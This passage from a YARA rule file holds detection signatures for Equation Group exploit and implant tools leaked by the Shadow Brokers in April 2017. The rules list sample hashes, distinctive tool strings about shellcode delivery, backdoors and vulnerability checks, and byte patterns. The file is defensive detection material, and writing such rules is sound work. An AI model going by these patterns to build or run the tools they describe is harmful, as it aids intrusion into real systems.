      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 23:53:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "48251fb89c510fb3efa14c4b5b546fbde918ed8bb25f041a801e3874bd4f60f8"
      hash2 = "237c22f4d43fdacfcbd6e1b5f1c71578279b7b06ea8e512b4b6b50f10e8ccf10"
      hash3 = "79a584c127ac6a5e96f02a9c5288043ceb7445de2840b608fc99b55cf86507ed"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "[-] Failed to Prepare Payload!" fullword ascii
      $x2 = "ShellcodeStartOffset" fullword ascii
      $x3 = "[*] Waiting for AuthCode from exploit" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_Explodingcantouch_1_2_1_RID3AA6 : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 19:55:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "0cdde7472b077610d0068aa7e9035da89fe5d435549749707cae24495c8d8444"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "[-] Connection closed by remote host (TCP Ack/Fin)" fullword ascii
      $s2 = "[!]Warning: Error on first request - path size may actually be larger than indicated." fullword ascii
      $s4 = "<http://%s/%s> (Not <locktoken:write1>) <http://%s/>" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 150KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_Architouch_1_0_0_RID37AE : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 17:48:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "444979a2387530c8fbbc5ddb075b15d6a4717c3435859955f37ebc0f40a4addc"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "[+] Target is %s" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )
}

rule EquationGroup_Toolset_Apr17_Erraticgopher_1_0_1_RID38F4 : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 18:43:11"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "3d11fe89ffa14f267391bc539e6808d600e465955ddb854201a1f31a9ded4052"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "[-] Error appending shellcode buffer" fullword ascii
      $x2 = "[-] Shellcode is too big" fullword ascii
      $x3 = "[+] Exploit Payload Sent!" fullword ascii
      $x4 = "[+] Bound to Dimsvc, sending exploit request to opnum 29" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 150KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_Esteemaudit_2_1_0_RID3820 : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 18:07:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "61f98b12c52739647326e219a1cf99b5440ca56db3b6177ea9db4e3b853c6ea6"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "[+] Connected to target %s:%d" fullword ascii
      $x2 = "[-] build_exploit_run_x64():" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_Darkpulsar_1_1_0_RID37BE : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 17:51:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "b439ed18262aec387984184e86bfdb31ca501172b1c066398f8c56d128ba855a"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "[%s] - Error upgraded DLL architecture does not match target architecture (0x%x)" fullword ascii
      $x2 = "[%s] - Error building DLL loading shellcode" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them )
}

rule EquationGroup_Toolset_Apr17_Educatedscholar_1_0_0_RID39AF : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 19:14:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "4cce9e39c376f67c16df3bcd69efd9b7472c3b478e2e5ef347e1410f1105c38d"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "[+] Shellcode Callback %s:%d" fullword ascii
      $x2 = "[+] Exploiting Target" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 150KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_Doublepulsar_1_3_1_RID389A : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 18:28:11"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "15ffbb8d382cd2ff7b0bd4c87a7c0bffd1541c2fe86865af445123bc0b770d13"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "[+] Ping returned Target architecture: %s - XOR Key: 0x%08X" fullword ascii
      $x2 = "[.] Sending shellcode to inject DLL" fullword ascii
      $x3 = "[-] Error setting ShellcodeFile name" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_Erraticgophertouch_1_0_1_RID3B17 : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 20:14:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "729eacf20fe71bd74e57a6b829b45113c5d45003933118b53835779f0b049bad"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "[-] Unable to connect to broswer named pipe, target is NOT vulnerable" fullword ascii
      $x2 = "[-] Unable to bind to Dimsvc RPC syntax, target is NOT vulnerable" fullword ascii
      $x3 = "[+] Bound to Dimsvc, target IS vulnerable" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 30KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_Smbtouch_1_1_1_RID36EB : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 17:16:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "108243f61c53f00f8f1adcf67c387a8833f1a2149f063dd9ef29205c90a3c30a"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "[+] Target is vulnerable to %d exploit%s" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them )
}

rule EquationGroup_Toolset_Apr17_Educatedscholartouch_1_0_0_RID3BD2 : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 20:45:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "f4b958a0d3bb52cb34f18ea293d43fa301ceadb4a259d3503db912d0a9a1e4d8"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "[!] A vulnerable target will not respond." fullword ascii
      $x2 = "[-] Target NOT Vulernable" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 30KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_Esteemaudittouch_2_1_0_RID3A43 : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 19:39:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "f6b9caf503bb664b22c6d39c87620cc17bdb66cef4ccfa48c31f2a3ae13b4281"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "[-] Touching the target failed!" fullword ascii
      $x2 = "[-] OS fingerprint not complete - 0x%08x!" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_Rpctouch_2_1_0_RID36EE : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 17:16:51"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "7fe4c3cedfc98a3e994ca60579f91b8b88bf5ae8cf669baa0928508642c5a887"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "[*] Failed to detect OS / Service Pack on %s:%d" fullword ascii
      $x2 = "[*] SMB String: %s (%s)" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 80KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_Mofconfig_1_0_0_RID373C : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 17:29:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "c67a24fe2380331a101d27d6e69b82d968ccbae54a89a2629b6c135436d7bdb2"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "[-] Get RemoteMOFTriggerPath error" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 50KB and all of them )
}

rule EquationGroup_Toolset_Apr17_Easypi_Explodingcan_RID399C : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 19:11:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "dc1ddad7e8801b5e37748ec40531a105ba359654ffe8bdb069bd29fb0b5afd94"
      hash2 = "97af543cf1fb59d21ba5ec6cb2f88c8c79c835f19c8f659057d2f58c321a0ad4"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "[-] %s - Target might not be in a usable state." fullword ascii
      $x2 = "[*] Exploiting Target" fullword ascii
      $x3 = "[-] Encoding Exploit Payload failed!" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_Eclipsedwingtouch_1_0_4_RID3AA9 : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 19:56:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "46da99d80fc3eae5d1d5ab2da02ed7e61416e1eafeb23f37b180c46e9eff8a1c"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "[-] The target is NOT vulnerable" fullword ascii
      $x2 = "[+] The target IS VULNERABLE" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 50KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_Iistouch_1_2_2_RID36F0 : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 17:17:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "c433507d393a8aa270576790acb3e995e22f4ded886eb9377116012e247a07c6"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "[-] Are you being redirectect? Need to retarget?" fullword ascii
      $x2 = "[+] IIS Target OS: %s" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 60KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_Namedpipetouch_2_0_0_RID395B : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 19:00:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "cb5849fcbc473c7df886828d225293ffbd8ee58e221d03b840fd212baeda6e89"
      hash2 = "043d1c9aae6be65f06ab6f0b923e173a96b536cf84e57bfd7eeb9034cd1df8ea"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "[*] Summary: %d pipes found" fullword ascii
      $s3 = "[+] Testing %d pipes" fullword ascii
      $s6 = "[-] Error on SMB startup, aborting" fullword ascii
      $s12 = "92a761c29b946aa458876ff78375e0e28bc8acb0" fullword ascii
      $op1 = { 68 10 10 40 00 56 e8 e1 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 40KB and 2 of them )
}

rule EquationGroup_Toolset_Apr17_Easybee_1_0_1_RID3663 : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 16:53:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "59c17d6cb564edd32c770cd56b5026e4797cf9169ff549735021053268b31611"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "@@for /f \"delims=\" %%i in ('findstr /smc:\"%s\" *.msg') do if not \"%%MsgFile1%%\"==\"%%i\" del /f \"%%i\"" fullword ascii
      $x2 = "Logging out of WebAdmin (as target account)" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_Regread_1_1_1_RID3660 : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 16:53:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "722f034ba634f45c429c7dafdbff413c08976b069a6b30ec91bfa5ce2e4cda26"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "[+] Connected to the Registry Service" fullword ascii
      $s2 = "f08d49ac41d1023d9d462d58af51414daff95a6a" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 80KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_Englishmansdentist_1_2_0_RID3B1A : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 20:14:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "2a6ab28885ad7d5d64ac4c4fb8c619eca3b7fb3be883fc67c90f3ea9251f34c6"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "[+] CheckCredentials(): Checking to see if valid username/password" fullword ascii
      $x2 = "Error connecting to target, TbMakeSocket() %s:%d." fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_Architouch_Eternalsynergy_Smbtouch_RID3FDF : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 23:38:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "444979a2387530c8fbbc5ddb075b15d6a4717c3435859955f37ebc0f40a4addc"
      hash2 = "92c6a9e648bfd98bbceea3813ce96c6861487826d6b2c3d462debae73ed25b34"
      hash3 = "108243f61c53f00f8f1adcf67c387a8833f1a2149f063dd9ef29205c90a3c30a"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "NtErrorMoreProcessingRequired" fullword ascii
      $s2 = "Command Format Error: Error=%x" fullword ascii
      $s3 = "NtErrorPasswordRestriction" fullword ascii
      $op0 = { 8a 85 58 ff ff ff 88 43 4d } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and 2 of them )
}

rule EquationGroup_Toolset_Apr17_Eternalromance_2_RID3837 : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 18:11:41"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "f1ae9fdbb660aae3421fd3e5b626c1e537d8e9ee2f9cd6d56cb70b6878eaca5d"
      hash2 = "b99c3cc1acbb085c9a895a8c3510f6daaf31f0d2d9ccb8477c7fb7119376f57b"
      hash3 = "92c6a9e648bfd98bbceea3813ce96c6861487826d6b2c3d462debae73ed25b34"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "[+] Backdoor shellcode written" fullword ascii
      $x2 = "[*] Attempting exploit method %d" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17__Emphasismine_RID3738 : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 17:29:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "dcaf91bd4af7cc7d1fb24b5292be4e99c7adf4147892f6b3b909d1d84dd4e45b"
      hash2 = "348eb0a6592fcf9da816f4f7fc134bcae1b61c880d7574f4e19398c4ea467f26"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "Error: Could not calloc() for shellcode buffer" fullword ascii
      $x2 = "shellcodeSize: 0x%04X + 0x%04X + 0x%04X = 0x%04X" fullword ascii
      $x3 = "Generating shellcode" fullword ascii
      $x4 = "([0-9a-zA-Z]+) OK LOGOUT completed" fullword ascii
      $x5 = "Error: Domino is not the expected version. (%s, %s)" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_Eternalromance_RID37A6 : APT DEMO EXE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 17:47:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "f1ae9fdbb660aae3421fd3e5b626c1e537d8e9ee2f9cd6d56cb70b6878eaca5d"
      hash2 = "b99c3cc1acbb085c9a895a8c3510f6daaf31f0d2d9ccb8477c7fb7119376f57b"
      tags = "APT, DEMO, EXE"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "[-] Error: Exploit choice not supported for target OS!!" fullword ascii
      $x2 = "Error: Target machine out of NPP memory (VERY BAD!!) - Backdoor removed" fullword ascii
      $x3 = "[-] Error: Backdoor not present on target" fullword ascii
      $x4 = "***********    TARGET ARCHITECTURE IS X64    ************" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of them ) or 2 of them
}

rule EquationGroup_Toolset_Apr17_Gen4_RID3344 : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 14:40:31"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "fe7ce2fdb245c62e4183c728bc97e966a98fdc8ffd795ed09da23f96e85dcdcd"
      hash2 = "0989bfe351342a7a1150b676b5fd5cbdbc201b66abcb23137b1c4de77a8f61a6"
      hash3 = "270850303e662be53d90fa60a9e5f4bd2bfb95f92a046c77278257631d9addf4"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "[+] \"TargetPort\"      %hu" fullword ascii
      $x2 = "---<<<  Complete  >>>---" fullword ascii
      $x3 = "[+] \"NetworkTimeout\"  %hu" fullword ascii
      $op1 = { 46 83 c4 0c 83 fe 0c 0f 8c 5e ff ff ff b8 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 150KB and ( 1 of ( $x* ) or 2 of them ) )
}

rule EquationGroup_Toolset_Apr17_Gen1_RID3341 : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 14:40:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "1b5b33931eb29733a42d18d8ee85b5cd7d53e81892ff3e60e2e97f3d0b184d31"
      hash2 = "139697168e4f0a2cc73105205c0ddc90c357df38d93dbade761392184df680c7"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "Restart with the new protocol, address, and port as target." fullword ascii
      $x2 = "TargetPort      : %s (%u)" fullword ascii
      $x3 = "Error: strchr() could not find '@' in account name." fullword ascii
      $x4 = "TargetAcctPwd   : %s" fullword ascii
      $x5 = "Creating CURL connection handle..." fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 80KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_Gen2_RID3342 : APT DEMO EXE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 14:40:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "7fe425cd040608132d4f4ab2671e04b340a102a20c97ffdcf1b75be43a9369b5"
      hash2 = "561c0d4fc6e0ff0a78613d238c96aed4226fbb7bb9ceea1d19bc770207a6be1e"
      hash3 = "f2e90e04ddd05fa5f9b2fec024cd07365aebc098593d636038ebc2720700662b"
      tags = "APT, DEMO, EXE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "[+] Setting password : (NULL)" fullword ascii
      $s2 = "[-] TbBuffCpy() failed!" fullword ascii
      $s3 = "[+] SMB negotiation" fullword ascii
      $s4 = "12345678-1234-ABCD-EF00-0123456789AB" fullword ascii
      $s5 = "Value must end with 0000 (2 NULLs)" fullword ascii
      $s6 = "[*] Configuring Payload" fullword ascii
      $s7 = "[*] Connecting to listener" fullword ascii
      $op1 = { b0 42 40 00 89 44 24 30 c7 44 24 34 } 
      $op2 = { eb 59 8b 4c 24 10 68 1c 46 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 80KB and 1 of ( $s* ) and 1 of ( $op* ) ) or 3 of them
}

rule EquationGroup_Toolset_Apr17_Gen3_RID3343 : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 14:40:21"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "270850303e662be53d90fa60a9e5f4bd2bfb95f92a046c77278257631d9addf4"
      hash2 = "7a086c0acb6df1fa304c20733f96e898d21ca787661270f919329fadfb930a6e"
      hash3 = "c236e0d9c5764f223bd3d99f55bd36528dfc0415e14f5fde1e5cdcada14f4ec0"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "Logon failed.  Kerberos ticket not yet valid (target and KDC times not synchronized)" fullword ascii
      $s2 = "[-] Could not set \"CredentialType\"" fullword ascii
      $op1 = { 46 83 c4 0c 83 fe 0c 0f 8c 5e ff ff ff b8 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 150KB and 2 of them )
}

rule EquationGroup_Toolset_Apr17_yak_RID333B : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 14:39:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "66ff332f84690642f4e05891a15bf0c9783be2a64edb2ef2d04c9205b47deb19"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "-xd = dump archive data & store in scancodes.txt" fullword ascii
      $x2 = "-------- driver start token -------" fullword wide
      $x3 = "-------- keystart token -------" fullword wide
      $x4 = "-xta = same as -xt but show special chars & store in keys_all.txt" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 800KB and 2 of them )
}

rule EquationGroup_Toolset_Apr17_AdUser_Implant_RID376E : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 17:38:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "fd2efb226969bc82e2e38769a10a8a751138db69f4594a8de4b3c0522d4d885f"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = ".?AVFeFinallyFailure@@" fullword ascii
      $s2 = "(&(objectCategory=person)(objectClass=user)(cn=" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 40KB and all of them )
}

rule EquationGroup_Toolset_Apr17_Banner_Implant9x_RID3831 : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 18:10:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "5d69a8cfc9b636448f023fcf18d111f13a8e6bcb9a693eb96276e0d796ab4e0c"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = ".?AVFeFinallyFailure@@" fullword ascii
      $op1 = { c9 c3 57 8d 85 2c eb ff ff } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 20KB and all of them )
}

